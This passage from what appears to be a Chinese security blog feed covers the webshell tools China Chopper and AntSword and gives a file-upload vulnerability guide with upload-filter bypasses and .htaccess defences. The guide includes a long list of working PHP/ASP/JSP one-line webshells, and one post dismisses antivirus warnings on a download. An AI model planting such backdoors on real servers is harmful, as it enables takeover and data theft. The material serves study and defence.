alt="9bffc4d9be2d2eed6de85dd2cbfb1eb1.png"></p><p>操作效果截图二：</p><p><img src="/../pic/%E8%8F%9C%E5%88%80.assets/a66964d1860a190bbed14bedec0280c5.png" alt="a66964d1860a190bbed14bedec0280c5.png"></p><p>操作效果截图三：</p><p><img src="/../pic/%E8%8F%9C%E5%88%80.assets/357271a14d8428acbeefbbd56020869f.png" alt="357271a14d8428acbeefbbd56020869f.png"></p><p>菜刀下载：</p><p>终于写完了，喜欢的话就支持一下哦，代潇瑞博客，专注于PHP学习！！</p><p>最后说明一下：此软件打开时杀毒软件可能会报毒的，我已经用了很多遍，反正都没事。如果你不相信的话，也就不用下载了，呵呵。</p>]]></content>
      
      
      <categories>
          
          <category> Tools </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>蚁剑教程</title>
      <link href="/2023/03/26/%E8%9A%81%E5%89%91%E6%95%99%E7%A8%8B/"/>
      <url>/2023/03/26/%E8%9A%81%E5%89%91%E6%95%99%E7%A8%8B/</url>
      
        <content type="html"><![CDATA[<h1 id="蚁剑教程"><a href="#蚁剑教程" class="headerlink" title="蚁剑教程"></a>蚁剑教程</h1><h2 id="0x00-简介"><a href="#0x00-简介" class="headerlink" title="0x00 简介"></a>0x00 简介</h2><p>蚁剑(AntSword)是一款开源的跨平台WebShell管理工具，它主要面向于合法授权的渗透测试安全人员以及进行常规操作的网站管理员。</p><p>蚁剑推崇模块化的开发思想，遵循开源，就要开得漂亮的原则，致力于为不同层次的人群提供最简单易懂、方便直接的代码展示及其修改说明，努力让大家可以一起为这个项目贡献出力所能及的点滴，让这款工具真正能让大家用得顺心、舒适，让它能为大家施展出最人性化最适合你的能力！</p><h2 id="0x02-基本使用"><a href="#0x02-基本使用" class="headerlink" title="0x02 基本使用"></a>0x02 基本使用</h2><p>使用蚁剑需要一个WEB环境，本次使用PHPStudy搭建测试环境</p><h2 id="2-1-创建PHP测试站点"><a href="#2-1-创建PHP测试站点" class="headerlink" title="2.1 创建PHP测试站点"></a>2.1 创建PHP测试站点</h2><p><img src="/../pic/%E8%9A%81%E5%89%91%E6%95%99%E7%A8%8B.assets/v2-884ee929e97ccf4b23752f02921bcd1f_720w.webp" alt="img"></p><p><img src="/../pic/%E8%9A%81%E5%89%91%E6%95%99%E7%A8%8B.assets/v2-a00ffac0b9aa5449ed9f2f77f6267414_720w.webp" alt="img"></p><p>浏览器访问</p><p><img src="/../pic/%E8%9A%81%E5%89%91%E6%95%99%E7%A8%8B.assets/v2-38e2ca386564483b667c2db00c3e9aee_720w.webp" alt="img"></p><p>注意：这里如果报403是正常情况(个人取消了PHPstudy默认页面)</p><h2 id="2-2-制作PHP后门"><a href="#2-2-制作PHP后门" class="headerlink" title="2.2 制作PHP后门"></a>2.2 制作PHP后门</h2><p>蚁剑官方为我们提供了制作好的后门</p><p>项目地址：<a href="https://link.zhihu.com/?target=https://github.com/AntSwordProject/AwesomeScript">https://github.com/AntSwordProject/AwesomeScript</a></p><p><img src="/../pic/%E8%9A%81%E5%89%91%E6%95%99%E7%A8%8B.assets/v2-20419a51b18ca99337fcebd02c217b02_720w.webp" alt="img"></p><p>官方的脚本均做了不同程度“变异”，在之后的教程中逐渐讲解，本次使用经典的PHP一句话木马</p><p><img src="/../pic/%E8%9A%81%E5%89%91%E6%95%99%E7%A8%8B.assets/v2-e5575152768f0ffb6d91e8fb2b86a50e_720w.webp" alt="img"></p><p>将木马放在站点目录下</p><p><img src="/../pic/%E8%9A%81%E5%89%91%E6%95%99%E7%A8%8B.assets/v2-d855b0e9fbb7f46671c85f9eab3f5b20_720w.webp" alt="img"></p><p>开启浏览器访问木马</p><p><img src="/../pic/%E8%9A%81%E5%89%91%E6%95%99%E7%A8%8B.assets/v2-9dfd64c807aaeadc238c2d355535c7e4_720w.webp" alt="img"></p><p>返回空白，打开浏览器开发工具查看数据包</p><p><img src="/../pic/%E8%9A%81%E5%89%91%E6%95%99%E7%A8%8B.assets/v2-9e03066559abc2f3adff524cae06dbb6_720w.webp" alt="img"></p><p>响应码为200，说明脚本正常运行</p><h2 id="2-3-使用蚁剑连接WebShell"><a href="#2-3-使用蚁剑连接WebShell" class="headerlink" title="2.3 使用蚁剑连接WebShell"></a>2.3 使用蚁剑连接WebShell</h2><p>打开蚁剑添加数据</p><p><img src="/../pic/%E8%9A%81%E5%89%91%E6%95%99%E7%A8%8B.assets/v2-b977acf1559dcd1261d9b3068c3b20ca_720w.webp" alt="img"></p><p>填写连接信息，点击测试</p><p><img src="/../pic/%E8%9A%81%E5%89%91%E6%95%99%E7%A8%8B.assets/v2-1226317e66df42df86490f29463d21a7_720w.webp" alt="img"></p><p>测试正常，点击添加</p><p><img src="/../pic/%E8%9A%81%E5%89%91%E6%95%99%E7%A8%8B.assets/v2-71c0e3def4e13dee45e4689ddc5cbf66_720w.webp" alt="img"></p><p><img src="/../pic/%E8%9A%81%E5%89%91%E6%95%99%E7%A8%8B.assets/v2-843685590cfd20c6a611a85621fea3c3_720w.webp" alt="img"></p><p>选中该项右键查看功能菜单</p><p><img src="/../pic/%E8%9A%81%E5%89%91%E6%95%99%E7%A8%8B.assets/v2-8085dfec5fb157661b6880a5596bbdc4_720w.webp" alt="img"></p><p>点击虚拟终端</p><p><img src="/../pic/%E8%9A%81%E5%89%91%E6%95%99%E7%A8%8B.assets/v2-e80471307e02c57bfb46ecb8af4f1901_720w.webp" alt="img"></p><p>执行dir命令</p><p><img src="/../pic/%E8%9A%81%E5%89%91%E6%95%99%E7%A8%8B.assets/v2-7f3d916cbb396e6e8277a0a0e654bde6_720w.webp" alt="img"></p><p>回到主菜单</p><p><img src="/../pic/%E8%9A%81%E5%89%91%E6%95%99%E7%A8%8B.assets/v2-9b911db41e9e7d02ac432b2c625a0a7c_720w.webp" alt="img"></p><p>选择文件管理</p><p><img src="/../pic/%E8%9A%81%E5%89%91%E6%95%99%E7%A8%8B.assets/v2-70ccc965bcef7f91db5599a02c723c37_720w.webp" alt="img"></p><p><img src="/../pic/%E8%9A%81%E5%89%91%E6%95%99%E7%A8%8B.assets/v2-8c71d7a435e26728387d49e0c75a8a4b_720w.webp" alt="img"></p><p>双击shell.php查看内容，注意关闭的位置</p><p><img src="/../pic/%E8%9A%81%E5%89%91%E6%95%99%E7%A8%8B.assets/v2-9e99650a82b7e29db739f28f79b8081a_720w.webp" alt="img"></p><h2 id="0x03-END"><a href="#0x03-END" class="headerlink" title="0x03 END"></a>0x03 END</h2><p>本次演示了如何使用蚁剑连接webshell以及虚拟终端和文件管理两大功能，望各位都能连接属于自己的专属shell</p>]]></content>
      
      
      <categories>
          
          <category> Tools </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>文件上传漏洞</title>
      <link href="/2023/03/26/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/"/>
      <url>/2023/03/26/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/</url>
      
        <content type="html"><![CDATA[<h1 id="文件上传漏洞-上传知识点、题型总结大全-upload靶场全解"><a href="#文件上传漏洞-上传知识点、题型总结大全-upload靶场全解" class="headerlink" title="文件上传漏洞 (上传知识点、题型总结大全-upload靶场全解)"></a>文件上传漏洞 (上传知识点、题型总结大全-upload靶场全解)</h1><hr><h3 id="什么是文件上传漏洞"><a href="#什么是文件上传漏洞" class="headerlink" title="什么是文件上传漏洞"></a>什么是文件上传漏洞</h3><p>文件上传漏洞是指由于程序员在对用户文件上传部分的控制不足或者处理缺陷，而导致的用户可以越过其本身权限向服务器上上传可执行的动态脚本文件。这里上传的文件可以是木马，病毒，恶意脚本或者WebShell等。“文件上传”本身没有问题，有问题的是文件上传后，服务器怎么处理、解释文件。如果服务器的处理逻辑做的不够安全，则会导致严重的后果。</p><hr><hr><h3 id="什么是webshell"><a href="#什么是webshell" class="headerlink" title="什么是webshell"></a>什么是webshell</h3><p>**WebShell就是以asp、php、jsp或者cgi等网页文件形式存在的一种命令执行环境，也可以将其称之为一种网页后门。*<em>攻击者在入侵了一个网站后，通常会将这些asp或php后门文件与网站服务器web目录下正常的网页文件混在一起，然后使用浏览器来访问这些后门，得到一个命令执行环境，以达到控制网站服务器的目的*<em>（可以上传下载或者修改文件，操作数据库，执行任意命令等）。</em></em> <strong>WebShell后门隐蔽较性高，可以轻松穿越防火墙，访问WebShell时不会留下系统日志，只会在网站的web日志中留下一些数据提交记录</strong></p><hr><hr><h3 id="一句话木马大全"><a href="#一句话木马大全" class="headerlink" title="一句话木马大全"></a>一句话木马大全</h3><p><strong>可跳过~~</strong><br>常用的webshell就是一句话木马，结合中国菜刀或者hackbar等工具可以很高效快捷的获得网站shell。</p><pre><code>##PHP：&lt;?php @eval($_POST[&#39;r00ts&#39;]);?&gt; &lt;?php phpinfo();?&gt;&lt;?php @eval($_POST[cmd]);?&gt;&lt;?php @eval($_REQUEST[cmd]);?&gt;&lt;?php assert($_REQUEST[cmd]); ?&gt;&lt;?php //?cmd=phpinfo() @preg_replace(&quot;/abc/e&quot;,$_REQUEST[&#39;cmd&#39;],&quot;abcd&quot;); ?&gt;&lt;?php //?cmd=phpinfo();$func =create_function(&#39;&#39;,$_REQUEST[&#39;cmd&#39;]);$func();?&gt;&lt;?php//?func=system&amp;cmd=whoami$func=$_GET[&#39;func&#39;];$cmd=$_GET[&#39;cmd&#39;];$array[0]=$cmd;$new_array=array_map($func,$array);//print_r($new_array);?&gt;&lt;?php //?cmd=phpinfo()@call_user_func(assert,$_GET[&#39;cmd&#39;]);?&gt;&lt;?php //?cmd=phpinfo()$cmd=$_GET[&#39;cmd&#39;];$array[0]=$cmd;call_user_func_array(&quot;assert&quot;,$array);?&gt;&lt;?php //?func=system&amp;cmd=whoami$cmd=$_GET[&#39;cmd&#39;];$array1=array($cmd);$func =$_GET[&#39;func&#39;];array_filter($array1,$func);?&gt;&lt;?php usort($_GET,&#39;asse&#39;.&#39;rt&#39;);?&gt; php环境&gt;=&lt;5.6才能用&lt;?php usort(...$_GET);?&gt;  php环境&gt;=5.6才能用&lt;?php eval($_POST1);?&gt; &lt;?php if(isset($_POST[&#39;c&#39;]))&#123;eval($_POST[&#39;c&#39;]);&#125;?&gt; &lt;?php system($_REQUEST1);?&gt; &lt;?php ($_=@$_GET1).@$_($_POST1)?&gt; &lt;?php eval_r($_POST1)?&gt; &lt;?php @eval_r($_POST1)?&gt;//容错代码 &lt;?php assert($_POST1);?&gt;//使用Lanker一句话客户端的专家模式执行相关的PHP语句 &lt;?$_POST[&#39;c&#39;]($_POST[&#39;cc&#39;]);?&gt; &lt;?$_POST[&#39;c&#39;]($_POST[&#39;cc&#39;],$_POST[&#39;cc&#39;])?&gt; &lt;?php @preg_replace(&quot;/[email]/e&quot;,$_POST[&#39;h&#39;],&quot;error&quot;);?&gt;/*使用这个后,使用菜刀一句话客户端在配置连接的时候在&quot;配置&quot;一栏输入*/:&lt;O&gt;h=@eval_r($_POST1);&lt;/O&gt; &lt;?php echo `$_GET[&#39;r&#39;]` ?&gt; &lt;script language=&quot;php&quot;&gt;@eval_r($_POST[sb])&lt;/script&gt; //绕过&lt;?限制的一句话&lt;?php (])?&gt;   上面这句是防杀防扫的！网上很少人用！可以插在网页任何ASP文件的最底部不会出错，比如 index.asp里面也是可以的！&lt;?if(isset($_POST[&#39;1&#39;]))&#123;eval($_POST[&#39;1&#39;]);&#125;?&gt;&lt;?php system ($_REQUEST[1]);?&gt; 加了判断的PHP一句话，与上面的ASP一句话相同道理，也是可以插在任何PHP文件 的最底部不会出错！&lt;%execute request(“class”)%&gt;&lt;%&#39;&lt;% loop &lt;%:%&gt;&lt;%&#39;&lt;% loop &lt;%:%&gt;&lt;%execute request (“class”)%&gt;&lt;%execute request(“class”)&#39;&lt;% loop &lt;%:%&gt; 无防下载表，有防下载表可尝试插入以下语句突破的一句话 &lt;%eval(request(“1″)):response.end%&gt; 备份专用##JSP：&lt;%if(request.getParameter(&quot;f&quot;)!=null)(newjava.io.FileOutputStream (application.getRealPath(&quot;\\&quot;)+request.getParameter(&quot;f&quot;))).write (request.getParameter(&quot;t&quot;).getBytes());%&gt; 提交客户端 &lt;form action=&quot;&quot; method=&quot;post&quot;&gt;&lt;textareaname=&quot;t&quot;&gt;&lt;/textarea&gt;&lt;br/&gt;&lt;input type=&quot;submit&quot;value=&quot;提交&quot;&gt;&lt;/form&gt;##ASP&lt;%eval(Request.Item[&quot;r00ts&quot;],”unsafe”);%&gt;&lt;%IfRequest(“1″)&lt;&gt;”&quot;ThenExecuteGlobal(Request(“1″))%&gt; &lt;%execute(request(“1″))%&gt; &lt;scriptrunat=server&gt;execute request(“1″)&lt;/script&gt; 不用&#39;&lt;,&gt;‘的asp一句话 ##aspx&lt;scriptrunat=”server”&gt;WebAdmin2Y.x.y aaaaa =newWebAdmin2Y.x.y (“add6bb58e139be10″);&lt;/script&gt; &lt;script language=&quot;C#&quot;runat=&quot;server&quot;&gt;WebAdmin2Y.x.y a=new WebAdmin2Y.x.y(&quot;add6bb58e139be10&quot;)&lt;/script&gt; &lt;%eval request(chr(35))%&gt;  不用双引号的一句话。</code></pre><hr><hr><h3 id="产生文件上传漏洞的原因"><a href="#产生文件上传漏洞的原因" class="headerlink" title="产生文件上传漏洞的原因"></a>产生文件上传漏洞的原因</h3><blockquote><p><strong>原因：</strong></p><ul><li>对于上传文件的后缀名（扩展名）没有做较为严格的限制</li><li>对于上传文件的MIMETYPE(用于描述文件的类型的一种表述方法) 没有做检查</li><li>权限上没有对于上传的文件目录设置不可执行权限，（尤其是对于shebang类型的文件）</li><li>对于web server对于上传文件或者指定目录的行为没有做限制</li></ul></blockquote><hr><blockquote><p><strong>原理：</strong><br>在 WEB 中进行文件上传的原理是通过将表单设为 multipart&#x2F;form-data，同时加入文件域，而后通过 HTTP 协议将文件内容发送到服务器，服务器端读取这个分段 (multipart) 的数据信息，并将其中的文件内容提取出来并保存的。通常，在进行文件保存的时候，服务器端会读取文件的原始文件名，并从这个原始文件名中得出文件的扩展名，而后随机为文件起一个文件名 ( 为了防止重复 )，并且加上原始文件的扩展名来保存到服务器上</p><p>文件上传后导致的常见安全问题一般有:</p><ul><li>上传文件是Web脚本语言，服务器的Web容器解释并执行了用户上传的脚本,导致代码执行;</li><li>上传文件是Flash的策略文件crossdomain.xml,黑客用以控制Flash在该域下的行为(其<br>他通过类似方式控制策略文件的情况类似);</li><li>上传文件是病毒、木马文件，黑客用以诱骗用户或者管理员下载执行:</li><li>上传文件是钓鱼图片或为包含了脚本的图片，在某些版本的浏览器中会被作为脚本执<br>行，被用于钓鱼和欺诈。</li></ul><p>除此之外，还有一些不常见的利用方法，比如将上传文件作为一个入口,溢出服务器的后台处理程序，如图片解析模块;或者上传-一个合法的文本文件， 其内容包含了PHP脚本，再通过“本地文件包含漏洞(Local File Include)”执行此脚本;等等。此类问题不在此细述。</p></blockquote><hr><hr><h3 id="文件上传漏洞的攻击与防御方式"><a href="#文件上传漏洞的攻击与防御方式" class="headerlink" title="文件上传漏洞的攻击与防御方式"></a>文件上传漏洞的攻击与防御方式</h3><h4 id="1-前端限制"><a href="#1-前端限制" class="headerlink" title="1.前端限制"></a>1.前端限制</h4><pre><code>&lt;li id=&quot;show_code&quot;&gt;    &lt;h3&gt;代码&lt;/h3&gt;&lt;pre&gt;&lt;code class=&quot;line-numbers language-javascript&quot;&gt;function checkFile() &#123;    var file = document.getElementsByName(&#39;upload_file&#39;)[0].value;    if (file == null || file == &quot;&quot;) &#123;        alert(&quot;请选择要上传的文件!&quot;);        return false;    &#125;    //定义允许上传的文件类型    var allow_ext = &quot;.jpg|.png|.gif&quot;;    //提取上传文件的类型    var ext_name = file.substring(file.lastIndexOf(&quot;.&quot;));    //判断上传文件类型是否允许上传    if (allow_ext.indexOf(ext_name + &quot;|&quot;) == -1) &#123;        var errMsg = &quot;该文件不允许上传，请上传&quot; + allow_ext + &quot;类型的文件,当前文件类型为：&quot; + ext_name;        alert(errMsg);        return false;    &#125;&#125;&lt;/code&gt;&lt;/pre&gt;&lt;/li&gt;</code></pre><p><strong>原理</strong></p><p><strong>在表单中使用onsumbit&#x3D;checkFile()调用js函数来检查上传文件的扩展名。当用户在客户端选择文件点击上传的时候，客户端还没有向服务器发送任何消息，就对本地文件进行检测来判断是否是可以上传的类型，这种方式称为前台脚本检测扩展名。</strong></p><p><strong>绕过方法</strong></p><p>这种限制很简单，通过浏览器F12很简单的修改文件后缀名就可以完成绕过检查，或者是讲木马修改后缀名后上传，通过改包工具修改上传。如果是JS脚本检测，在本地浏览器客户端禁用JS即可。可使用火狐浏览器的NoScript插件、IE中禁用掉JS等方式实现绕过。</p><p><strong>操作方法</strong></p><p>准备一句话木马：</p><pre><code>&lt;?php@eval($_POST[&#39;cmd&#39;]);?&gt;</code></pre><p>并且修改后缀名为jpg，上传操作，通过burpsuit抓包改包，使其后缀名修改回php。</p><hr><h4 id="2-检查扩展名"><a href="#2-检查扩展名" class="headerlink" title="2.检查扩展名"></a>2.检查扩展名</h4><p><strong>就是在文件被上传到服务端的时候，对于文件名的扩展名进行检查，如果不合法，则拒绝这次上传</strong><br>在检查扩展名是否合法的时候，有两种策略：</p><h5 id="1-黑名单策略，"><a href="#1-黑名单策略，" class="headerlink" title="1.黑名单策略，"></a>1.黑名单策略，</h5><p>文件扩展名在黑名单中的为不合法<br><strong>示例</strong></p><pre><code>//黑名单策略&lt;li id=&quot;show_code&quot;&gt;    &lt;h3&gt;代码&lt;/h3&gt;&lt;pre&gt;&lt;code class=&quot;line-numbers language-php&quot;&gt;$is_upload = false;$msg = null;if (isset($_POST[&#39;submit&#39;])) &#123;    if (file_exists(UPLOAD_PATH)) &#123;        $deny_ext = array(&#39;.asp&#39;,&#39;.aspx&#39;,&#39;.php&#39;,&#39;.jsp&#39;);        $file_name = trim($_FILES[&#39;upload_file&#39;][&#39;name&#39;]);        $file_name = deldot($file_name);//删除文件名末尾的点        $file_ext = strrchr($file_name, &#39;.&#39;);        $file_ext = strtolower($file_ext); //转换为小写        $file_ext = str_ireplace(&#39;::$DATA&#39;, &#39;&#39;, $file_ext);//去除字符串::$DATA        $file_ext = trim($file_ext); //收尾去空        if(!in_array($file_ext, $deny_ext)) &#123;            $temp_file = $_FILES[&#39;upload_file&#39;][&#39;tmp_name&#39;];            $img_path = UPLOAD_PATH.&#39;/&#39;.date(&quot;YmdHis&quot;).rand(1000,9999).$file_ext;                        if (move_uploaded_file($temp_file,$img_path)) &#123;                 $is_upload = true;            &#125; else &#123;                $msg = &#39;上传出错！&#39;;            &#125;        &#125; else &#123;            $msg = &#39;不允许上传.asp,.aspx,.php,.jsp后缀文件！&#39;;        &#125;    &#125; else &#123;        $msg = UPLOAD_PATH . &#39;文件夹不存在,请手工创建！&#39;;    &#125;&#125;&lt;/code&gt;&lt;/pre&gt;&lt;/li&gt;</code></pre><h5 id="2-白名单策略"><a href="#2-白名单策略" class="headerlink" title="2.白名单策略"></a>2.白名单策略</h5><p>文件扩展名不在白名单中的均为不合法<br><strong>示例</strong></p><pre><code>&lt;li id=&quot;show_code&quot;&gt;    &lt;h3&gt;代码&lt;/h3&gt;&lt;pre&gt;&lt;code class=&quot;line-numbers language-php&quot;&gt;$is_upload = false;$msg = null;if(isset($_POST[&#39;submit&#39;]))&#123;    $ext_arr = array(&#39;jpg&#39;,&#39;png&#39;,&#39;gif&#39;);    $file_ext = substr($_FILES[&#39;upload_file&#39;][&#39;name&#39;],strrpos($_FILES[&#39;upload_file&#39;][&#39;name&#39;],&quot;.&quot;)+1);    if(in_array($file_ext,$ext_arr))&#123;        $temp_file = $_FILES[&#39;upload_file&#39;][&#39;tmp_name&#39;];        $img_path = $_GET[&#39;save_path&#39;].&quot;/&quot;.rand(10, 99).date(&quot;YmdHis&quot;).&quot;.&quot;.$file_ext;        if(move_uploaded_file($temp_file,$img_path))&#123;            $is_upload = true;        &#125; else &#123;            $msg = &#39;上传出错！&#39;;        &#125;    &#125; else&#123;        $msg = &quot;只允许上传.jpg|.png|.gif类型文件！&quot;;    &#125;&#125;&lt;/code&gt;&lt;/pre&gt;&lt;/li&gt;</code></pre><p><strong>原理</strong><br><strong>当浏览器将文件提交到服务器端的时候，服务器端会根据设定的黑白名单对浏览器提交上来的文件扩展名进行检测，如果上传的文件扩展名不符合黑白名单的限制，则不予上传，否则上传成功。</strong></p><p><strong>绕过方法</strong></p><blockquote><p>在一些Web server中，存在解析漏洞:<br><strong>1.老版本的IIS6中的目录解析漏洞，如果网站目录中有一个 &#x2F;.asp&#x2F;目录，那么此目录下面的一切内容都会被当作asp脚本来解析<br>2.老版本的IIS6中的分号漏洞：IIS在解析文件名的时候可能将分号后面的内容丢弃，那么我们可以在上传的时候给后面加入分号内容来避免黑名单过滤，如 a.asp;jpg<br>3.旧版Windows Server中存在空格和dot漏洞类似于 a.php. 和 a.php[空格] 这样的文件名存储后会被windows去掉点和空格，从而使得加上这两个东西可以突破过滤，成功上传，并且被当作php代码来执行<br>4.nginx(0.5.x, 0.6.x, 0.7 &lt;&#x3D; 0.7.65, 0.8 &lt;&#x3D; 0.8.37)空字节漏洞 xxx.jpg%00.php 这样的文件名会被解析为php代码运行（fastcgi会把这个文件当php看，不受空字节影响，但是检查文件后缀的那个功能会把空字节后面的东西抛弃，所以识别为jpg）<br>5.apache1.x,2.x的解析漏洞，上传如a.php.rar a.php.gif 类型的文件名，可以避免对于php文件的过滤机制，但是由于apache在解析文件名的时候是从右向左读，如果遇到不能识别的扩展名则跳过，rar等扩展名是apache不能识别的，因此就会直接将类型识别为php，从而达到了注入php代码的目的</strong></p></blockquote><hr><h4 id="3-检查Content-Type"><a href="#3-检查Content-Type" class="headerlink" title="3.检查Content-Type"></a>3.检查Content-Type</h4><p><strong>原理</strong></p><p>HTTP协议规定了上传资源的时候在Header中加上一项文件的MIMETYPE，来识别文件类型，这个动作是由浏览器完成的，服务端可以检查此类型不过这仍然是不安全的,因为HTTP header可以被发出者或者中间人任意的修改。</p><p><strong>常见类型</strong></p><table><thead><tr><th>文件后缀</th><th>Mime类型</th><th>说明</th></tr></thead><tbody><tr><td>.flv</td><td>flv&#x2F;flv-flash</td><td>在线播放</td></tr><tr><td>.html或.htm</td><td>text&#x2F;html</td><td>超文本标记语言文本</td></tr><tr><td>.rtf</td><td>application&#x2F;rtf</td><td>RTF文本</td></tr><tr><td>.gif 或.png</td><td>image&#x2F;gif(image&#x2F;png)</td><td>GIF图形&#x2F;PNG图片</td></tr><tr><td>.jpeg或.jpg</td><td>image&#x2F;jpeg</td><td>JPEG图形</td></tr><tr><td>.au</td><td>audio&#x2F;basic</td><td>au声音文件</td></tr><tr><td>.mid或.midi</td><td>audio&#x2F;midi或audio&#x2F;x-midi</td><td>MIDI音乐文件</td></tr><tr><td>.ra或.ram或.rm</td><td>audio&#x2F;x-pn-realaudio</td><td>RealAudio音乐文件</td></tr><tr><td>.mpg或.mpeg或.mp3</td><td>video&#x2F;mpeg</td><td>MPEG文件</td></tr><tr><td>.avi</td><td>video&#x2F;x-msvideo</td><td>AVI文件</td></tr><tr><td>.gz</td><td>application&#x2F;x-gzip</td><td>GZIP文件</td></tr><tr><td>.tar</td><td>application&#x2F;x-tar</td><td>TAR文件</td></tr><tr><td>.exe</td><td>application&#x2F;octet-stream</td><td>下载文件类型</td></tr><tr><td>.rmvb</td><td>video&#x2F;vnd.rn-realvideo</td><td>在线播放</td></tr><tr><td>.txt</td><td>text&#x2F;plain</td><td>普通文本</td></tr><tr><td>.mrp</td><td>application&#x2F;octet-stream</td><td>MRP文件（国内普遍的手机）</td></tr><tr><td>.ipa</td><td>application&#x2F;iphone-package-archive</td><td>IPA文件(IPHONE)</td></tr><tr><td>.deb</td><td>application&#x2F;x-debian-package-archive</td><td>DED文件(IPHONE)</td></tr><tr><td>.apk</td><td>application&#x2F;vnd.android.package-archive</td><td>APK文件(安卓系统)</td></tr><tr><td>.cab</td><td>application&#x2F;vnd.cab-com-archive</td><td>CAB文件(Windows Mobile)</td></tr><tr><td>.xap</td><td>application&#x2F;x-silverlight-app</td><td>XAP文件(Windows Phone 7)</td></tr><tr><td>.sis</td><td>application&#x2F;vnd.symbian.install-archive</td><td>SIS文件(symbian平台)</td></tr><tr><td>.jar</td><td>application&#x2F;java-archive</td><td>JAR文件(JAVA平台手机通用格式)</td></tr><tr><td>.jad</td><td>text&#x2F;vnd.sun.j2me.app-descriptor</td><td>JAD文件(JAVA平台手机通用格式)</td></tr><tr><td>.sisx</td><td>application&#x2F;vnd.symbian.epoc&#x2F;x-sisx-app</td><td>SISX文件(symbian平台)</td></tr></tbody></table><p>显示详细信息</p><p><strong>绕过方法</strong><br>使用各种各样的工具（如burpsuite）强行篡改Header就可以，将Content-Type: application&#x2F;php改为其他web程序允许的类型。</p><hr><h4 id="4-文件头检查文件"><a href="#4-文件头检查文件" class="headerlink" title="4.文件头检查文件"></a>4.文件头检查文件</h4><p><strong>原理</strong></p><p><strong>利用的是每一个特定类型的文件都会有不太一样的开头或者标志位。</strong></p><table><thead><tr><th>格式</th><th>文件头</th></tr></thead><tbody><tr><td>TIFF (tif)</td><td>49492A00</td></tr><tr><td>Windows Bitmap (bmp)</td><td>424D</td></tr><tr><td>CAD (dwg)</td><td>41433130</td></tr><tr><td>Adobe Photoshop (psd)</td><td>38425053</td></tr><tr><td>JPEG (jpg)</td><td>FFD8FF</td></tr><tr><td>PNG (png)</td><td>89504E47</td></tr><tr><td>GIF (gif)</td><td>47494638</td></tr><tr><td>XML (xml)</td><td>3C3F786D6C</td></tr><tr><td>HTML (html)</td><td>68746D6C3E</td></tr><tr><td>MS Word&#x2F;Excel (xls.or.doc)</td><td>D0CF11E0</td></tr><tr><td>MS Access (mdb)</td><td>5374616E64617264204A</td></tr><tr><td>ZIP Archive (zip)，</td><td>504B0304</td></tr><tr><td>RAR Archive (rar)，</td><td>52617221</td></tr><tr><td>Wave (wav)，</td><td>57415645</td></tr><tr><td>AVI (avi)，</td><td>41564920</td></tr><tr><td>Adobe Acrobat (pdf)，</td><td>255044462D312E</td></tr></tbody></table><p>显示详细信息</p><p><strong>绕过方法</strong></p><p>给上传脚本加上相应的幻数头字节就可以，php引擎会将 &lt;?之前的内容当作html文本，不解释而跳过之，后面的代码仍然能够得到执行比如下面：<br>（一般不限制图片文件格式的时候使用GIF的头比较方便，因为全都是文本可打印字符。）</p><hr><h4 id="5-限制Web-Server对特定类型文件的行为"><a href="#5-限制Web-Server对特定类型文件的行为" class="headerlink" title="5.限制Web Server对特定类型文件的行为"></a>5.限制Web Server对特定类型文件的行为</h4><p><strong>原理</strong></p><p>导致文件上传漏洞的根本原因在于服务把用户上传的本应是数据的内容当作了代码，一般而言：用户上传的内容都会被存储到特定的一个文件夹下，比如我们很多人习惯于放在 .&#x2F;upload&#x2F; 下面要防止数据被当作代码执行，我们可以限制web server对于特定文件夹的行为。</p><p>大多数服务端软件都可以支持用户对于特定类型文件的行为的自定义，以Apache为例：</p><blockquote><p>在默认情况下，对与 .php文件Apache会当作代码来执行，对于 html,css,js文件，则会直接由HTTP Response交给客户端程序对于一些资源文件，比如txt，doc，rar等等，则也会以文件下载的方式传送的客户端。我们希望用户上传的东西仅仅当作资源和数据而不能当作代码。因此Apache使用服务器程序的接口来进行限制利用 .htaccess 文件机制来对web server行为进行限制。</p></blockquote><p>禁止脚本执行有多种方式可以实现，而且分别有不同的效果：</p><ul><li><strong>指定特定扩展名的文件的处理方式</strong>,原理是指定Response的Content-Type可以加上如下几行</li></ul><pre><code>   AddType text/plain .pl .py .php</code></pre><p>这种情况下，以上几种脚本文件会被当作纯文本来显示出来，你也可以换成其他的Content-Type</p><p>这种情况下，以上几种脚本文件会被当作纯文本来显示出来，你也可以换成其他的Content-Type</p><ul><li><p>如果要<strong>完全禁止特定扩展名的文件被访问</strong>，用下面的几行</p><pre><code>Options -ExecCGIAddHandler cgi-script .php .pl .py .jsp .asp .htm .shtml .sh .cgi识别</code></pre><p>在这种情况下，以上几种类型的文件被访问的时候，会返回403 Forbidden的错误</p></li><li><p>强制web服务器对于特定文件类型的处理，<strong>与第一条不同的是， 下面的方法直接强行让apache将文件识别为你指定的类型，而第一种是让浏览器符合上面正则的全部被认为是纯文本，也可以继续往里面加入其他类型。</strong></p></li></ul><pre><code>&lt;FilesMatch &quot;\.(php|pl|py|jsp|asp|htm|shtml|sh|cgi)$&quot;&gt;ForceType text/plain&lt;/FilesMatch&gt;</code></pre><ul><li><strong>只允许访问特定类型的文件</strong>.使得该文件夹里面只有图片扩展名的文件才可以被访问，其他类型都是拒绝访问(白名单策略)。</li></ul><pre><code>&lt;Files ^(*.jpeg|*.jpg|*.png|*.gif)&gt;order deny,allowdeny from all&lt;/Files&gt;</code></pre><p><strong>绕过方法</strong></p><p><strong>可以通过 move_uploaded_file 函数把自己写的.htaccess 文件上传，覆盖掉服务器上的文件，来定义文件类型和执行权限如果做到了这一点，将获得相当大的权限。</strong></p><blockquote><p>补充知识htaccess：</p><p>.htaccess文件(或者”分布式配置文件”）,全称是Hypertext Access(超文本入口)。提供了针对目录改变配置的方法， 即，在一个特定的文档目录中放置一个包含一个或多个指令的文件， 以作用于此目录及其所有子目录。作为用户，所能使用的命令受到限制。管理员可以通过Apache的<a href="https://baike.baidu.com/item/AllowOverride">AllowOverride</a>指令来设置。概述来说，htaccess文件是<a href="https://baike.baidu.com/item/Apache">Apache</a>服务器中的一个配置文件，它负责相关目录下的网页配置。通过htaccess文件，可以帮我们实现：网页<a 